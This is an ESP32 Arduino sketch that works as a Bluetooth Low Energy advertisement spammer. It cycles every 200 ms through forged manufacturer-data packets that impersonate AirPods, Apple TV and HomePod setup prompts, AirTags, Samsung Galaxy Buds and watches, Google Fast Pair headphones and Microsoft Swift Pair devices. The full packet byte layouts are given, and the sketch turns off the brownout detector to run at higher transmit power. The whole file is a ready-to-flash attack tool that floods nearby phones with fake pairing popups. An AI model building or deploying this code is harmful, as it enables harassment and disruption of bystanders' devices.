#include <Arduino.h>
#include <esp_system.h>
#include <BLEDevice.h>
#include <BLEAdvertising.h>
#include <BLESecurity.h>
#include <string.h>
#include "soc/rtc_cntl_reg.h"

#define DEVICE_NAME "new fush found"
#define ROTATE_MS   200UL     // dwell per identity; floor ~150
#define TX_POWER    ESP_PWR_LVL_P6   // P9 = more reach, more LDO sag
#define KILL_BROWNOUT 1

// 0 = grouped sweep  1 = grouped, randomised inside group  2 = fully random
#define ORDER_MODE  0
#define VERBOSE     0

static BLEAdvertising* advertising = nullptr;
static uint32_t lastRotate = 0;
static uint16_t failStreak = 0;

enum Kind : uint8_t {
  K_APPLE_BUDS,
  K_APPLE_NEARBY,
  K_APPLE_TAG,
  K_SAMSUNG,
  K_FASTPAIR,
  K_SWIFT,
};

struct Entry { Kind kind; uint32_t id; const char* name; };

static const Entry TABLE[] = {
  { K_APPLE_BUDS, 0x0220, "AirPods 1st Gen" },
  { K_APPLE_BUDS, 0x0F20, "AirPods 2nd Gen" },
  { K_APPLE_BUDS, 0x1320, "AirPods 3rd Gen" },
  { K_APPLE_BUDS, 0x0E20, "AirPods Pro" },
  { K_APPLE_BUDS, 0x1420, "AirPods Pro 2" },
  { K_APPLE_BUDS, 0x0A20, "AirPods Max" },
  { K_APPLE_BUDS, 0x0620, "Beats Solo3" },
  { K_APPLE_BUDS, 0x0920, "Beats Studio3" },
  { K_APPLE_BUDS, 0x0520, "BeatsX" },
  { K_APPLE_BUDS, 0x1020, "Beats Flex" },
  { K_APPLE_BUDS, 0x0320, "Powerbeats3" },
  { K_APPLE_BUDS, 0x0B20, "Powerbeats Pro" },
  { K_APPLE_BUDS, 0x1220, "Beats Fit Pro" },
  { K_APPLE_BUDS, 0x1120, "Beats Studio Buds" },
  { K_APPLE_BUDS, 0x1720, "Beats Studio Pro" },
  { K_APPLE_BUDS, 0x1820, "Powerbeats Fit" },
  { K_APPLE_NEARBY, 0x01, "AppleTV Setup" },
  { K_APPLE_NEARBY, 0x02, "AppleTV Connecting" },
  { K_APPLE_NEARBY, 0x03, "AppleTV Pair" },
  { K_APPLE_NEARBY, 0x04, "AppleTV Audio Sync" },
  { K_APPLE_NEARBY, 0x05, "AppleTV Color Balance" },
  { K_APPLE_NEARBY, 0x06, "AppleTV HomeKit Setup" },
  { K_APPLE_NEARBY, 0x07, "AppleTV New User" },
  { K_APPLE_NEARBY, 0x08, "AppleTV iCloud Setup" },
  { K_APPLE_NEARBY, 0x09, "AppleTV Software Update" },
  { K_APPLE_NEARBY, 0x0A, "AppleTV AirPlay" },
  { K_APPLE_NEARBY, 0x0B, "HomePod Setup" },
  { K_APPLE_NEARBY, 0x0C, "HomePod Connecting" },
  { K_APPLE_NEARBY, 0x0D, "HomePod Pair" },
  { K_APPLE_NEARBY, 0x0E, "HomePod Audio Sync" },
  { K_APPLE_NEARBY, 0x0F, "HomePod Color Balance" },
  { K_APPLE_NEARBY, 0x10, "HomePod Software Update" },
  { K_APPLE_NEARBY, 0x11, "HomePod HomeKit Setup" },
  { K_APPLE_NEARBY, 0x12, "HomePod New User" },
  { K_APPLE_NEARBY, 0x13, "HomePod iCloud Setup" },
  { K_APPLE_NEARBY, 0x14, "HomePod AirPlay" },
  { K_APPLE_TAG,    0,    "AirTag" },
  { K_SAMSUNG, 1,  "Galaxy Buds" },
  { K_SAMSUNG, 2,  "Galaxy Buds+" },
  { K_SAMSUNG, 3,  "Galaxy Buds Live" },
  { K_SAMSUNG, 4,  "Galaxy Buds Pro" },
  { K_SAMSUNG, 5,  "Galaxy Buds2" },
  { K_SAMSUNG, 6,  "Galaxy Buds2 Pro" },
  { K_SAMSUNG, 7,  "Galaxy Buds FE" },
  { K_SAMSUNG, 8,  "Galaxy Watch" },
  { K_SAMSUNG, 9,  "Galaxy Watch4" },
  { K_SAMSUNG, 10, "Galaxy Watch4 Classic" },
  { K_SAMSUNG, 11, "Galaxy Watch5" },
  { K_SAMSUNG, 12, "Galaxy Watch5 Pro" },
  { K_SAMSUNG, 13, "Galaxy Watch6" },
  { K_SAMSUNG, 14, "Galaxy Watch6 Classic" },
  { K_SAMSUNG, 15, "Galaxy Watch7" },
  { K_SAMSUNG, 16, "Galaxy Watch Ultra" },
  { K_FASTPAIR, 0x9ADA0F, "Pixel Buds" },
  { K_FASTPAIR, 0x9ADB0F, "Pixel Buds A-Series" },
  { K_FASTPAIR, 0x9ADC0F, "Pixel Buds Pro" },
  { K_FASTPAIR, 0x000021, "JBL Flip 6" },
  { K_FASTPAIR, 0x000022, "JBL Buds Pro" },
  { K_FASTPAIR, 0x000023, "JBL Live 300TWS" },
  { K_FASTPAIR, 0x000024, "JBL LIVE 650BTNC" },
  { K_FASTPAIR, 0x000025, "JBL Tune 125TWS" },
  { K_FASTPAIR, 0x000026, "JBL Tune 225TWS" },
  { K_FASTPAIR, 0x00000C, "Bose NC 700" },
  { K_FASTPAIR, 0x000009, "Bose QC35 II" },
  { K_FASTPAIR, 0x0000CE, "Sony WH-1000XM4" },
  { K_FASTPAIR, 0x0000CF, "Sony WH-1000XM5" },
  { K_FASTPAIR, 0x0000D0, "Sony WF-1000XM4" },
  { K_FASTPAIR, 0x0000D1, "Sony LinkBuds S" },
  { K_FASTPAIR, 0x0000A1, "ATH-CK3TW" },
  { K_FASTPAIR, 0x0000A2, "ATH-CK1W" },
  { K_FASTPAIR, 0x000031, "LG HBS-835S" },
  { K_FASTPAIR, 0x000032, "LG HBS-1125" },
  { K_FASTPAIR, 0x000033, "LG Tone Free HBS-FN6" },
  { K_FASTPAIR, 0x000051, "Razer Hammerhead TW" },
  { K_FASTPAIR, 0x000052, "Razer Hammerhead TWS X" },
  { K_FASTPAIR, 0x000061, "Soundcore Spirit Pro" },
  { K_FASTPAIR, 0x000062, "Soundcore Life P3" },
  { K_FASTPAIR, 0x000063, "Soundcore Liberty Air 2 Pro" },
  { K_FASTPAIR, 0x000071, "Jabra Elite 75t" },
  { K_FASTPAIR, 0x000072, "Jabra Elite 85t" },
  { K_FASTPAIR, 0x000073, "Jabra Elite 7 Pro" },
  { K_FASTPAIR, 0x000081, "OnePlus Buds Pro" },
  { K_FASTPAIR, 0x000082, "Realme Buds Air Pro" },
  { K_FASTPAIR, 0x000083, "Xiaomi FlipBuds Pro" },
  { K_FASTPAIR, 0x0000B1, "TicWatch Pro 3" },
  { K_FASTPAIR, 0x0000B2, "TicWatch Pro 5" },
  { K_FASTPAIR, 0x0000B3, "Fitbit Versa / Sense" },
  { K_SWIFT, 0, "Surface Headphones" },
  { K_SWIFT, 0, "Surface Earbuds" },
  { K_SWIFT, 0, "Xbox Wireless Controller" },
  { K_SWIFT, 0, "Surface Pen" },
  { K_SWIFT, 0, "Microsoft Arc Mouse" },
};

static const size_t N = sizeof(TABLE) / sizeof(TABLE[0]);

static uint8_t order[N];
static size_t  pos = N;

struct Block { size_t s, e; };
static Block  blocks[16];
static size_t blockCount = 0;

static uint8_t pktBuf[32];
static String  mfr;

static void computeBlocks() {
  blockCount = 0;
  size_t i = 0;
  while (i < N && blockCount < 16) {
    size_t j = i;
    while (j < N && TABLE[j].kind == TABLE[i].kind) j++;
    blocks[blockCount].s = i;
    blocks[blockCount].e = j;
    blockCount++;
    i = j;
  }
}

static void shuffleRange(size_t s, size_t e) {
  if (e - s < 2) return;
  for (size_t i = e - 1; i > s; i--) {
    size_t j = s + esp_random() % (i - s + 1);
    uint8_t t = order[i]; order[i] = order[j]; order[j] = t;
  }
}

static void buildOrder() {
#if ORDER_MODE == 2
  for (size_t i = 0; i < N; i++) order[i] = (uint8_t)i;
  shuffleRange(0, N);
#elif ORDER_MODE == 1
  for (size_t b = 0; b < blockCount; b++) {
    for (size_t i = blocks[b].s; i < blocks[b].e; i++) order[i] = (uint8_t)i;
    shuffleRange(blocks[b].s, blocks[b].e);
  }
#else
  for (size_t i = 0; i < N; i++) order[i] = (uint8_t)i;
#endif
  pos = 0;
}

static size_t buildPacket(const Entry& e) {
  size_t n = 0;

  switch (e.kind) {
    case K_APPLE_BUDS: {
      const uint8_t h[] = { 0x4C, 0x00, 0x07, 0x19, 0x01,
                            (uint8_t)(e.id & 0xFF), (uint8_t)(e.id >> 8),
                            0x20, 0x44, 0x44, 0x44 };
      memcpy(pktBuf, h, sizeof(h));
      n = sizeof(h);
      memset(pktBuf + n, 0, 18);
      n += 18;
      break;
    }
    case K_APPLE_NEARBY: {
      const uint8_t h[] = { 0x4C, 0x00, 0x10, 0x05, 0x01, (uint8_t)e.id, 0x00, 0x00, 0x00 };
      memcpy(pktBuf, h, sizeof(h));
      n = sizeof(h);
      break;
    }
    case K_APPLE_TAG: {
      const uint8_t h[] = { 0x4C, 0x00, 0x12, 0x19, 0x00, 0x00, 0x00 };
      memcpy(pktBuf, h, sizeof(h));
      n = sizeof(h);
      for (int i = 0; i < 22; i++) pktBuf[n++] = (uint8_t)esp_random();
      break;
    }
    case K_SAMSUNG: {
      const uint8_t h[] = { 0x75, 0x00, 0x01, 0x00,
                            (uint8_t)(e.id & 0xFF), (uint8_t)(e.id >> 8) };
      memcpy(pktBuf, h, sizeof(h));
      n = sizeof(h);
      memset(pktBuf + n, 0, 0x15 - n);
      n = 0x15;
      break;
    }
    case K_FASTPAIR: {
      const uint8_t h[] = { 0xE0, 0x00, 0x03,
                            (uint8_t)(e.id >> 16), (uint8_t)(e.id >> 8),
                            (uint8_t)e.id, 0x00 };
      memcpy(pktBuf, h, sizeof(h));
      n = sizeof(h);
      break;
    }
    case K_SWIFT: {
      const uint8_t h[] = { 0x06, 0x00, 0x03, 0x00, 0x80 };
      memcpy(pktBuf, h, sizeof(h));
      n = sizeof(h);
      size_t l = strlen(e.name);
      if (l > sizeof(pktBuf) - n) l = sizeof(pktBuf) - n;
      memcpy(pktBuf + n, e.name, l);
      n += l;
      break;
    }
  }
  return n;
}

static void bleUp() {
  BLEDevice::init(DEVICE_NAME);
  BLEDevice::setPower(TX_POWER);

  advertising = BLEDevice::getAdvertising();
  advertising->setAdvertisementType(ADV_TYPE_NONCONN_IND);  // nothing can connect & stall us
  advertising->setScanResponse(false);
  advertising->setMinInterval(0x20);
  advertising->setMaxInterval(0x20);

  mfr.reserve(32);   // allocation happens once, never again
}

static void rotate() {
  if (pos >= N) buildOrder();
  const Entry& e = TABLE[order[pos++]];

  advertising->stop();

  size_t n = buildPacket(e);

  BLEAdvertisementData packet;
  if (2 + n + 3 <= 31) packet.setFlags(0x06);
  mfr = String((const char*)pktBuf, n);     // reuses the reserved buffer
  packet.setManufacturerData(mfr);

  advertising->setAdvertisementData(packet);

  if (!advertising->start()) {
    if (++failStreak >= 40) ESP.restart();  // hard recover; C3 deinit is unreliable
  } else {
    failStreak = 0;
  }

#if VERBOSE
  Serial.printf("adv -> %s\n", e.name);
#endif
}

void setup() {
#if VERBOSE
  Serial.begin(115200);
#endif
#if KILL_BROWNOUT
  WRITE_PERI_REG(RTC_CNTL_BROWN_OUT_REG, 0);
#endif
  randomSeed(esp_random());
  computeBlocks();
  buildOrder();
  bleUp();
  rotate();
  lastRotate = millis();
}

void loop() {
  if (millis() - lastRotate >= ROTATE_MS) {
    lastRotate = millis();
    rotate();
  }
  delay(5);
}
